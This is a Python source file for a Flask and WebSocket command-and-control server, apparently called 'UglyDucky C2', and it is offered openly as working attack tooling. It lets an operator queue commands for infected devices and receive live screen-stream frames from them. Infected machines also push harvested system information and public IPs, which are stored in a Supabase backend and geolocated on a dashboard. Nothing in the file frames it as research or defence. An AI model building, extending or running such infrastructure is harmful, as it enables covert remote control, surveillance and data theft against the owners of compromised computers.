# File: c2_listener.py
import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room
from datetime import datetime, timedelta, timezone

app = Flask(__name__)
CORS(app)
# Initialize SocketIO with Eventlet for high-performance async WebSockets
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', max_http_buffer_size=10000000)

SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY") 
DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")

command_queue = {}
dashboard_sockets = set()
payload_sockets = {}

# ---------------------------------------------------------
# WEBSOCKETS (LIVE STREAMING & COMMANDS)
# ---------------------------------------------------------
@socketio.on('connect')
def handle_connect():
    pass # Accept all connections initially

@socketio.on('register_dashboard')
def register_dash(data):
    """Dashboard authenticates and joins the admin room."""
    if data.get('password') == DASHBOARD_PASSWORD:
        dashboard_sockets.add(request.sid)
        join_room('dashboards')
        emit('dash_sys_msg', {'msg': 'WebSocket authenticated successfully.'})

@socketio.on('register_payload')
def register_payload(data):
    """Payload announces itself and joins a room specific to its ID."""
    device_id = data.get('device_id')
    if device_id:
        payload_sockets[device_id] = request.sid
        join_room(device_id)

@socketio.on('dash_command')
def dash_command(data):
    """Dashboard sends a real-time command (e.g., start_stream). Forward to specific payload."""
    if request.sid in dashboard_sockets:
        device_id = data.get('device_id')
        if device_id in payload_sockets:
            # Forward the exact data payload to the specific device's room
            emit('payload_command', data, room=device_id)

@socketio.on('payload_stream')
def payload_stream(data):
    """Payload sends video frames or monitor lists. Forward to all dashboards."""
    # Forward the frame instantly to the dashboard room
    emit('dash_stream', data, room='dashboards')

# ---------------------------------------------------------
# HTTP ENDPOINTS (VAULT & BACKWARD COMPATIBILITY)
# ---------------------------------------------------------
def get_node_status(last_seen_str, device_id):
    # If the payload has an active WebSocket, it's LIVE.
    if device_id in payload_sockets:
        return "green", "Live (WS)"
        
    if not last_seen_str: return "red", "Offline"
    last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
    now = datetime.now(timezone.utc)
    if now - last_seen < timedelta(minutes=2): return "green", "Online"
    if now - last_seen < timedelta(hours=1): return "yellow", "Idle"
    return "red", "Offline"

def geolocate_ip(ip):
    if not ip or ip in ["127.0.0.1", "Unknown"]: return 28.5383, -81.3792 
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if resp.ok and resp.json().get("status") == "success":
            return float(resp.json().get("lat")), float(resp.json().get("lon"))
    except: pass
    return 28.5383, -81.3792 

@app.route('/node/<device_id>', methods=['GET'])
def get_single_node(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    try:
        device_data = requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1", headers=headers).json()
        if not device_data: return jsonify({"error": "Node not found"}), 404
        last_seen = device_data[0]['created_at']

        sysinfo_resp = requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1", headers=headers)
        os_info, ip_info = "Windows", "Unknown IP"
        if sysinfo_resp.ok and sysinfo_resp.json():
            for line in sysinfo_resp.json()[0]['content'].split('\n'):
                if line.startswith('Caption='): os_info = line.split('=')[-1].strip()
                elif line.startswith('PUBLIC IP:'): ip_info = line.split(':')[-1].strip()

        status_color, stat_text = get_node_status(last_seen, device_id)
        lat, lng = geolocate_ip(ip_info)
        return jsonify({"id": device_id, "os": os_info, "ip": ip_info, "lat": lat, "lng": lng, "status": status_color, "stat_text": stat_text, "last_seen": last_seen})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    try: return jsonify(requests.get(f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc", headers=headers, timeout=10).json()), 200
    except: return jsonify({"error": "Fetch failed"}), 500

@app.route('/logs', methods=['POST'])
def push_logs():
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
    try: requests.post(f"{SUPABASE_URL}?on_conflict=device_id,category", json=request.json, headers=headers, timeout=15)
    except: pass
    return jsonify({"status": "success"}), 200

@app.route('/issue', methods=['POST'])
def issue_command():
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD: return jsonify({"error": "Unauthorized"}), 401
    command_queue[request.json.get('device_id')] = request.json.get('command')
    return jsonify({"status": "queued"}), 200

@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    return jsonify({"command": command_queue.pop(device_id, None)})

@app.route('/')
def index(): return "UglyDucky C2 WebSockets Active."

if __name__ == '__main__':
    # Must use socketio.run instead of app.run for WebSockets
    socketio.run(app, host='0.0.0.0', port=10000)
